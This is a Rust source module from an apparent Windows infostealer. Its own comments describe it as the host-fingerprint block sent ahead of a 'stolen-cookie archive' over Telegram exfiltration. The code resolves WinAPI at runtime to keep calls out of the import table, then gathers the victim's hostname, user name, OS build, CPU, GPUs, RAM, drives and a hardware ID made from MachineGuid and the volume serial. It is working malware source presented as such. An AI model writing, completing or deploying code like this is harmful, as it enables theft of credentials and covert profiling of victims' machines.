//! Host telemetry — the machine-info block for the Telegram exfil (wave 7).
//!
//! Every read is best-effort: a locked-down host or a missing value drops that
//! field to `None` instead of aborting the dump. All WinAPI goes through the
//! runtime-resolved tables in [`crate::apitable`], so nothing here adds an
//! import-table entry. There is nothing secret here by itself — it is the
//! device fingerprint that precedes the stolen-cookie archive on transport.

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use windows::Win32::System::Registry::{HKEY, HKEY_LOCAL_MACHINE, REG_SAM_FLAGS, REG_VALUE_TYPE};
use windows::core::{PCWSTR, PWSTR};

use crate::apitable::{
    DisplayDeviceW, MemoryStatusEx, RtlOsVersionInfoW, advapi32, kernel32, ntdll, user32,
};

/// `DISPLAY_DEVICE_ACTIVE` (bit 1 of DISPLAY_DEVICEW.StateFlags).
const DISPLAY_DEVICE_ACTIVE: u32 = 0x1;
/// `ComputerNamePhysicalDnsHostname` — the hostname shown on the network.
const COMPUTER_NAME_PHYSICAL_DNS_HOSTNAME: u32 = 5;
/// `REG_SZ` data type.
const REG_SZ: u32 = 1;
/// `REG_DWORD` data type.
const REG_DWORD: u32 = 4;
/// `DRIVE_FIXED` — GetDriveTypeW result for a hard disk / SSD / volume.
const DRIVE_FIXED: u32 = 3;
/// `ERROR_MORE_DATA` — registry value buffer too small.
const ERROR_MORE_DATA: u32 = 234;

/// One mounted fixed drive (C:, D:, ...). `letter` is the bare drive letter.
#[derive(Debug, Clone, Default)]
pub struct DiskInfo {
    pub letter: String,
    pub total: u64,
    pub free: u64,
}

/// One assembled machine-info block. `None` means "could not read on this host".
#[derive(Debug, Clone, Default)]
pub struct MachineInfo {
    pub display_name: Option<String>,
    pub device_name: Option<String>,
    pub user_name: Option<String>,
    pub os_version: Option<String>,
    pub cpu: Option<String>,
    /// Every *active* display adapter (iGPU + dGPU), deduped, in adapter order.
    pub gpus: Vec<String>,
    pub ram_total: Option<u64>,
    pub ram_avail: Option<u64>,
    /// Each fixed logical drive, ascending letter (system drive first).
    pub disks: Vec<DiskInfo>,
    pub hwid: Option<String>,
    pub public_ip: Option<String>,
    /// Human "city, region, country" from IP geolocation; probe lives in the
    /// telegram layer (network round-trip), so this stays `None` here.
    pub location: Option<String>,
}

/// Widen a UTF-16 buffer to a `String`, truncating at the first NUL.
fn wide_to_string(wide: &[u16]) -> Option<String> {
    let end = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
    if end == 0 {
        return None;
    }
    Some(String::from_utf16_lossy(&wide[..end]))
}

/// `GetComputerNameExW(ComputerNamePhysicalDnsHostname)` — the network-facing
/// display name.
fn display_name() -> Option<String> {
    let f = kernel32();
    let mut len = 1u32;
    let mut probe = [0u16; 1];
    // A 1-char buffer forces ERROR_MORE_DATA, so `len` comes back holding the
    // required size (GetComputerNameEx does not report size for a NULL buffer).
    let first = unsafe {
        (f.get_computer_name_ex_w)(
            COMPUTER_NAME_PHYSICAL_DNS_HOSTNAME,
            PWSTR(probe.as_mut_ptr()),
            &mut len,
        )
    };
    if !first.as_bool() && len <= 1 {
        return None;
    }
    let mut buf = vec![0u16; len as usize + 1];
    if unsafe {
        (f.get_computer_name_ex_w)(
            COMPUTER_NAME_PHYSICAL_DNS_HOSTNAME,
            PWSTR(buf.as_mut_ptr()),
            &mut len,
        )
    }
    .as_bool()
    {
        wide_to_string(&buf)
    } else {
        None
    }
}

/// The Windows "device name" (Control Panel → System) from
/// `HKLM\SYSTEM\...\ActiveComputerName`.
fn device_name() -> Option<String> {
    reg_sz(
        HKEY_LOCAL_MACHINE,
        r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName",
        "ComputerName",
    )
}

/// `GetUserNameW` — the account name the process runs under (fixed
/// MAXUNLEN-sized buffer; NT user names cap at 256 chars).
fn user_name() -> Option<String> {
    let mut buf = vec![0u16; 257];
    let mut len = buf.len() as u32;
    if unsafe { (advapi32().get_user_name_w)(PWSTR(buf.as_mut_ptr()), &mut len) }.as_bool() {
        wide_to_string(&buf)
    } else {
        None
    }
}

/// Detailed OS string, e.g. `Windows 11 Pro 24H2 (Build 26200.3007)`.
///
/// RtlGetVersion gives the NT version; `HKLM\...\Windows NT\CurrentVersion`
/// supplies the friendly marketing name (ProductName), the feature release
/// (DisplayVersion, "24H2") and the patch-level UBR, so the string reads the
/// way a Support screen would show it instead of a bare `10.0.26200`.
fn os_version() -> Option<String> {
    const KEY: &str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
    let (major, minor, build) = rtl_version()?;
    let product = reg_sz(HKEY_LOCAL_MACHINE, KEY, "ProductName");
    let display = reg_sz(HKEY_LOCAL_MACHINE, KEY, "DisplayVersion");
    let ubr = reg_dword(HKEY_LOCAL_MACHINE, KEY, "UBR");

    let mut name = product.unwrap_or_else(|| format!("Windows {major}.{minor}"));
    name = relabel_windows_version(&name, build);
    if let Some(d) = display {
        name.push(' ');
        name.push_str(&d);
    }
    let build = match ubr {
        Some(u) => format!("{build}.{u}"),
        None => build.to_string(),
    };
    Some(format!("{name} (Build {build})"))
}

/// Pure relabel: Microsoft never bumped the registry ProductName for Win11, so
/// many Win11 boxes report "Windows 10 Pro". Build >= 22000 is reliably
/// Windows 11 — relabel to keep the caption honest without the registry quirk.
fn relabel_windows_version(name: &str, build: u32) -> String {
    if build >= 22000 && name.starts_with("Windows 10") {
        name.replacen("Windows 10", "Windows 11", 1)
    } else {
        name.to_string()
    }
}

/// `RtlGetVersion` — the (major, minor, build) NT version triple (works on
/// Win11, unlike the deprecated GetVersionExW).
fn rtl_version() -> Option<(u32, u32, u32)> {
    let mut info = RtlOsVersionInfoW {
        dw_os_version_info_size: std::mem::size_of::<RtlOsVersionInfoW>() as u32,
        dw_major_version: 0,
        dw_minor_version: 0,
        dw_build_number: 0,
        dw_platform_id: 0,
        sz_csd_version: [0; 128],
    };
    let st = unsafe { (ntdll().rtl_get_version)(&mut info) };
    if st != 0 {
        return None;
    }
    Some((
        info.dw_major_version,
        info.dw_minor_version,
        info.dw_build_number,
    ))
}

/// CPU model from `HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0`.
fn cpu_model() -> Option<String> {
    reg_sz(
        HKEY_LOCAL_MACHINE,
        r"HARDWARE\DESCRIPTION\System\CentralProcessor\0",
        "ProcessorNameString",
    )
}

/// Every active display adapter's name ("NVIDIA GeForce RTX 3070",
/// "Intel(R) UHD Graphics", ...), deduped, in EnumDisplayDevices order.
fn gpu_names() -> Vec<String> {
    const MAX_ADAPTERS: u32 = 8;
    let size = std::mem::size_of::<DisplayDeviceW>() as u32;
    let mut names = Vec::new();
    for i in 0..MAX_ADAPTERS {
        let mut dd = DisplayDeviceW {
            cb: size,
            device_name: [0; 32],
            device_string: [0; 128],
            state_flags: 0,
            device_id: [0; 128],
            device_key: [0; 128],
        };
        // SAFETY: `dd` is zero-first, cb-sized DISPLAY_DEVICEW; EnumDisplayDevicesW
        // fills it in place; reading device_string afterwards is defined.
        let ok = unsafe { (user32().enum_display_devices_w)(PCWSTR::null(), i, &mut dd, 0) };
        if !ok.as_bool() {
            break;
        }
        if dd.state_flags & DISPLAY_DEVICE_ACTIVE != 0
            && let Some(n) = wide_to_string(&dd.device_string)
            && !n.trim().is_empty()
            && !names.contains(&n)
        {
            names.push(n);
        }
    }
    names
}

/// Physical RAM via `GlobalMemoryStatusEx`.
fn ram() -> (Option<u64>, Option<u64>) {
    let mut st = std::mem::MaybeUninit::<MemoryStatusEx>::zeroed();
    // SAFETY: zeroed MEMORYSTATUSEX is valid to hand the OS; GlobalMemoryStatusEx
    // fills it. Only dw_length must be set first.
    let p = st.as_mut_ptr();
    unsafe { (*p).dw_length = std::mem::size_of::<MemoryStatusEx>() as u32 };
    let ok = unsafe { (kernel32().global_memory_status_ex)(p) };
    if !ok.as_bool() {
        return (None, None);
    }
    // SAFETY: the OS wrote the struct; reading scalar u64 fields is defined.
    let filled = unsafe { st.assume_init() };
    (Some(filled.ull_total_phys), Some(filled.ull_avail_phys))
}

/// One drive root's (total, free) via `GetDiskFreeSpaceExW`.
fn disk_info(root: &str) -> Option<(u64, u64)> {
    let root_wide: Vec<u16> = OsStr::new(root)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let (mut free_to_caller, mut total, mut total_free) = (0u64, 0u64, 0u64);
    // SAFETY: root_wide is NUL-terminated UTF-16; the three u64 out-params are
    // caller-owned and only written by the OS on success.
    let ok = unsafe {
        (kernel32().get_disk_free_space_ex_w)(
            PCWSTR(root_wide.as_ptr()),
            &mut free_to_caller,
            &mut total,
            &mut total_free,
        )
    };
    if !ok.as_bool() {
        return None;
    }
    let _ = free_to_caller;
    Some((total, total_free))
}

/// Capacity of every fixed logical drive (C:, D:, ...), ascending letter.
///
/// `GetLogicalDrives` returns the A:..Z: presence bitmask; each present drive
/// is kept only when `GetDriveTypeW` reports `DRIVE_FIXED` (CD-ROM, network
/// and removable volumes are skipped). Falls back to the system drive alone if
/// the bitmask read fails.
fn disks() -> Vec<DiskInfo> {
    const DRIVE_LETTERS: u32 = 26;
    let f = kernel32();
    let mut out = Vec::new();
    let mask = unsafe { (f.get_logical_drives)() };
    if mask != 0 {
        for i in 0..DRIVE_LETTERS {
            if mask & (1 << i) == 0 {
                continue;
            }
            let letter = char::from_u32(b'A' as u32 + i).expect("A..Z");
            let root = format!("{letter}:\\");
            let root_wide: Vec<u16> = OsStr::new(&root)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();
            // SAFETY: NUL-terminated root path for the drive-type probe.
            let drive_type = unsafe { (f.get_drive_type_w)(PCWSTR(root_wide.as_ptr())) };
            if drive_type != DRIVE_FIXED {
                continue;
            }
            if let Some((total, free)) = disk_info(&root) {
                out.push(DiskInfo {
                    letter: letter.to_string(),
                    total,
                    free,
                });
            }
        }
    }
    if out.is_empty() {
        let system = std::env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string()) + "\\";
        let letter = system.trim_end_matches('\\').to_string();
        if let Some((total, free)) = disk_info(&system) {
            out.push(DiskInfo {
                letter,
                total,
                free,
            });
        }
    }
    out
}

/// Stable-ish machine ID: `MachineGuid` (HKLM) + system-volume serial, hex.
fn hwid() -> Option<String> {
    let guid = reg_sz(
        HKEY_LOCAL_MACHINE,
        r"SOFTWARE\Microsoft\Cryptography",
        "MachineGuid",
    );
    let serial = volume_serial()?;
    Some(match guid {
        Some(g) => format!("{g}-{serial:08X}"),
        None => format!("{serial:08X}"),
    })
}

/// Volume serial number of the system drive (survives image-name churn).
fn volume_serial() -> Option<u32> {
    let root = std::env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string()) + "\\";
    let root_wide: Vec<u16> = OsStr::new(&root)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let mut serial = 0u32;
    // SAFETY: NUL-terminated root; output pointers are caller-owned; we only
    // care about the serial, the rest are scratch buffers.
    let ok = unsafe {
        (kernel32().get_volume_information_w)(
            PCWSTR(root_wide.as_ptr()),
            PWSTR::null(),
            0,
            &mut serial,
            ptr::null_mut(),
            ptr::null_mut(),
            PWSTR::null(),
            0,
        )
    };
    if ok.as_bool() { Some(serial) } else { None }
}

/// Read a `REG_SZ` value at `root\subkey`, value `value`.
fn reg_sz(root: HKEY, subkey: &str, value: &str) -> Option<String> {
    let subkey_wide: Vec<u16> = OsStr::new(subkey)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let value_wide: Vec<u16> = OsStr::new(value)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    // SAFETY: both wide strings are NUL-terminated; KEY_QUERY_VALUE (0x0001) is
    // read-only; the returned key must be closed via the guard below.
    let mut hkey = HKEY(ptr::null_mut());
    if unsafe {
        (advapi32().reg_open_key_ex_w)(
            root,
            PCWSTR(subkey_wide.as_ptr()),
            0,
            REG_SAM_FLAGS(0x0001),
            &mut hkey,
        )
    }
    .0 != 0
    {
        return None;
    }
    let _guard = KeyGuard(hkey);

    let mut data_type = REG_VALUE_TYPE(0);
    let mut size = 0u32;
    // Size probe (ERROR_MORE_DATA ⇒ 234 is the common first answer).
    let first = unsafe {
        (advapi32().reg_query_value_ex_w)(
            hkey,
            PCWSTR(value_wide.as_ptr()),
            ptr::null(),
            &mut data_type,
            ptr::null_mut(),
            &mut size,
        )
    };
    if first.0 != 0 && first.0 != ERROR_MORE_DATA {
        return None;
    }

    let mut buf = vec![0u16; (size as usize / 2) + 1];
    loop {
        // SAFETY: buffer sized from the probe; RegQueryValueExW fills bytes and
        // updates size; ERROR_MORE_DATA grows and retries.
        let r = unsafe {
            (advapi32().reg_query_value_ex_w)(
                hkey,
                PCWSTR(value_wide.as_ptr()),
                ptr::null(),
                &mut data_type,
                buf.as_mut_ptr() as *mut u8,
                &mut size,
            )
        };
        match r.0 {
            0 => break,
            ERROR_MORE_DATA => buf = vec![0u16; (size as usize / 2) + 1],
            _ => return None,
        }
    }
    if data_type.0 != REG_SZ {
        return None;
    }
    wide_to_string(&buf)
}

/// Read a `REG_DWORD` value at `root\subkey`, value `value`.
fn reg_dword(root: HKEY, subkey: &str, value: &str) -> Option<u32> {
    let subkey_wide: Vec<u16> = OsStr::new(subkey)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let value_wide: Vec<u16> = OsStr::new(value)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    // SAFETY: NUL-terminated wide strings; read-only KEY_QUERY_VALUE (0x0001);
    // the key handle is closed by the guard below.
    let mut hkey = HKEY(ptr::null_mut());
    if unsafe {
        (advapi32().reg_open_key_ex_w)(
            root,
            PCWSTR(subkey_wide.as_ptr()),
            0,
            REG_SAM_FLAGS(0x0001),
            &mut hkey,
        )
    }
    .0 != 0
    {
        return None;
    }
    let _guard = KeyGuard(hkey);

    let mut data_type = REG_VALUE_TYPE(0);
    let mut data = 0u32;
    let mut size = std::mem::size_of::<u32>() as u32;
    // SAFETY: write into the caller-owned u32; RegQueryValueExW sets data_type.
    if unsafe {
        (advapi32().reg_query_value_ex_w)(
            hkey,
            PCWSTR(value_wide.as_ptr()),
            ptr::null(),
            &mut data_type,
            (&mut data as *mut u32).cast(),
            &mut size,
        )
    }
    .0 != 0
    {
        return None;
    }
    if data_type.0 != REG_DWORD {
        return None;
    }
    Some(data)
}

/// Close-on-drop registry key (read-only handle).
struct KeyGuard(HKEY);
impl Drop for KeyGuard {
    fn drop(&mut self) {
        // SAFETY: RegCloseKey on a key we opened (failure is benign).
        unsafe {
            let _ = (advapi32().reg_close_key)(self.0);
        }
    }
}

/// Assemble every locally-readable field. Network/IP is filled separately by
/// the caller (it needs an HTTP round-trip).
pub fn machine_info() -> MachineInfo {
    let (ram_total, ram_avail) = ram();
    MachineInfo {
        display_name: display_name(),
        device_name: device_name(),
        user_name: user_name(),
        os_version: os_version(),
        cpu: cpu_model(),
        gpus: gpu_names(),
        ram_total,
        ram_avail,
        disks: disks(),
        hwid: hwid(),
        public_ip: None,
        location: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wide_to_string_strips_nul() {
        assert_eq!(
            Some("abc".to_string()),
            wide_to_string(&[97, 98, 99, 0, 100])
        );
        assert_eq!(None, wide_to_string(&[0, 97]));
    }

    #[test]
    fn constants_are_stable() {
        assert_eq!(5, COMPUTER_NAME_PHYSICAL_DNS_HOSTNAME);
        assert_eq!(1, DISPLAY_DEVICE_ACTIVE);
        assert_eq!(1, REG_SZ);
        assert_eq!(4, REG_DWORD);
        assert_eq!(3, DRIVE_FIXED);
        assert_eq!(234, ERROR_MORE_DATA);
    }

    #[test]
    fn relabel_windows_version_handles_win11_quirk() {
        assert_eq!(
            "Windows 11 Pro",
            relabel_windows_version("Windows 10 Pro", 26200)
        );
        assert_eq!(
            "Windows 10 Pro",
            relabel_windows_version("Windows 10 Pro", 19045)
        );
        assert_eq!(
            "Windows 11 Enterprise",
            relabel_windows_version("Windows 11 Enterprise", 22631)
        );
        assert_eq!("", relabel_windows_version("", 26200));
    }

    /// Live-host smoke test: every registry/API read must assemble without
    /// panicking, and a real Windows box yields a hostname + HWID. Ignored by
    /// default (hits real WinAPI); run with `cargo test -p abi -- --ignored`.
    #[test]
    #[ignore = "live WinAPI smoke test"]
    fn machine_info_assembles_on_live_host() {
        let m = machine_info();
        assert!(m.display_name.is_some(), "hostname readable: {m:?}");
        assert!(m.hwid.is_some(), "hwid readable: {m:?}");
        assert!(m.os_version.is_some(), "os version readable: {m:?}");
    }
}
